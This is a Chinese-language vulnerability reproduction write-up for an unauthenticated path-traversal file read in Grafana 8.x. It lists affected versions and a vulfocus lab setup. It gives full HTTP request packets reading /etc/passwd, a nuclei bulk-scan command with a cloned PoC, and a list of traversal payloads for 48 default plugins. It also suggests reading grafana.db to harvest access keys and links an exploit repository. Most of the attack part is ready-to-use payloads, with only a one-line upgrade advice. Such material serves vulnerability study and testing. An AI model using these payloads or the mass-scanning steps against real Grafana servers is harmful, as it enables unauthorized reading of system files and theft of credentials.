# 0x00 漏洞描述
Grafana是一个跨平台、开源的数据可视化网络应用程序平台。用户配置连接的数据源之后，Grafana可以在网络浏览器里显示数据图表和警告。

Grafana 存在未授权任意文件读取漏洞，攻击者在未经身份验证的情况下可通过该漏洞读取主机上的任意文件。

该漏洞源于Grafana在获取公共插件资产的相关函数中对于路径参数的字符清理不当，导致攻击者可以通过将包含特殊目录遍历字符序列(../)的特制HTTP请求发送到受影响的设备来利用此漏洞。成功利用该漏洞的攻击者可以在目标设备上查看文件系统上的的任意文件。

# 0x01 影响范围

8.0.0-beta1 <= Grafana < 8.0.7
8.1.0 <= Grafana < 8.1.8

8.2.0 <= Grafana < 8.2.7

Grafana == 8.3.0

# 0x02 环境搭建
vulfocus

![image](https://user-images.githubusercontent.com/84888757/162635345-afdd14ff-ea8d-437a-aa49-196d881a7175.png)


# 0x03 漏洞复现
## 3.1 手工验证
1、简单判断是否存在：/public/plugins/a/a
400 啥的需要考虑中间件
```
GET /public/plugins/a/a  HTTP/1.1
Host: Your Ip:port
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: zh-CN,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Pragma: no-cache
Cache-Control: no-cache
```
存在：

![image](https://user-images.githubusercontent.com/84888757/162635405-0fd17a5b-9682-4548-b21b-ba64fd5b325a.png)

![image](https://user-images.githubusercontent.com/84888757/162635452-521f31d6-0f28-4874-8d5a-dd5d46a2ea45.png)


2、POC
```
https://xxxxxx.xx/public/plugins/grafana-clock-panel/../../../../../../etc/passwd
```

POC完整数据包：
```
GET /public/plugins/grafana-clock-panel/../../../../../../etc/passwd HTTP/1.1
Host: Your Ip:port
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

![image](https://user-images.githubusercontent.com/84888757/162635484-ccd4a59d-7165-4341-a2bb-e2a711e49f0b.png)

# 3.2 批量验证
- 工具：
  - [nuclei扫描工具](https://github.com/projectdiscovery/nuclei)
  - [CVE-2021-43798-Grafana-File-Read-->POC](https://github.com/tangxiaofeng7/CVE-2021-43798-Grafana-File-Read)

- Ubuntu18安装go
  - ```sudo apt-get install golang```

- 下载poc：

```
git clone https://github.com/tangxiaofeng7/CVE-2021-43798-Grafana-File-Read.git
```

- 使用nuclei工具
```
./nuclei -t grafana.yaml -list urls.txt -o Gresult.txt
```

![image](https://user-images.githubusercontent.com/84888757/162635695-1900cffb-5f67-44a2-afeb-5e41c3ffd856.png)


- 默认安装的插件（可测试）
```
/public/plugins/alertGroups/../../../../../../../../etc/passwd
/public/plugins/alertlist/../../../../../../../../etc/passwd
/public/plugins/alertmanager/../../../../../../../../etc/passwd
/public/plugins/annolist/../../../../../../../../etc/passwd
/public/plugins/barchart/../../../../../../../../etc/passwd
/public/plugins/bargauge/../../../../../../../../etc/passwd
/public/plugins/canvas/../../../../../../../../etc/passwd
/public/plugins/cloudwatch/../../../../../../../../etc/passwd
/public/plugins/dashboard/../../../../../../../../etc/passwd
/public/plugins/dashlist/../../../../../../../../etc/passwd
/public/plugins/debug/../../../../../../../../etc/passwd
/public/plugins/elasticsearch/../../../../../../../../etc/passwd
/public/plugins/gauge/../../../../../../../../etc/passwd
/public/plugins/geomap/../../../../../../../../etc/passwd
/public/plugins/gettingstarted/../../../../../../../../etc/passwd
/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd
/public/plugins/grafana/../../../../../../../../etc/passwd
/public/plugins/graph/../../../../../../../../etc/passwd
/public/plugins/graphite/../../../../../../../../etc/passwd
/public/plugins/heatmap/../../../../../../../../etc/passwd
/public/plugins/histogram/../../../../../../../../etc/passwd
/public/plugins/influxdb/../../../../../../../../etc/passwd
/public/plugins/jaeger/../../../../../../../../etc/passwd
/public/plugins/live/../../../../../../../../etc/passwd
/public/plugins/logs/../../../../../../../../etc/passwd
/public/plugins/loki/../../../../../../../../etc/passwd
/public/plugins/mixed/../../../../../../../../etc/passwd
/public/plugins/mssql/../../../../../../../../etc/passwd
/public/plugins/mysql/../../../../../../../../etc/passwd
/public/plugins/news/../../../../../../../../etc/passwd
/public/plugins/nodeGraph/../../../../../../../../etc/passwd
/public/plugins/opentsdb/../../../../../../../../etc/passwd
/public/plugins/piechart/../../../../../../../../etc/passwd
/public/plugins/pluginlist/../../../../../../../../etc/passwd
/public/plugins/postgres/../../../../../../../../etc/passwd
/public/plugins/prometheus/../../../../../../../../etc/passwd
/public/plugins/stat/../../../../../../../../etc/passwd
/public/plugins/state-timeline/../../../../../../../../etc/passwd
/public/plugins/status-history/../../../../../../../../etc/passwd
/public/plugins/table-old/../../../../../../../../etc/passwd
/public/plugins/table/../../../../../../../../etc/passwd
/public/plugins/tempo/../../../../../../../../etc/passwd
/public/plugins/testdata/../../../../../../../../etc/passwd
/public/plugins/text/../../../../../../../../etc/passwd
/public/plugins/timeseries/../../../../../../../../etc/passwd
/public/plugins/welcome/../../../../../../../../etc/passwd
/public/plugins/xychart/../../../../../../../../etc/passwd
/public/plugins/zipkin/../../../../../../../../etc/passwd
```

## RCE 思路
RCE方法-->读库(/var/lib/grafana/grafana.db)，有几率获取 AccessKey

## EXP
https://github.com/A-D-Team/grafanaExp

# 0x04 修复建议
建议升级该组件至最新版本。

# 0x05 参考链接
- https://47.101.61.67/detail?id=AVD-2021-916648
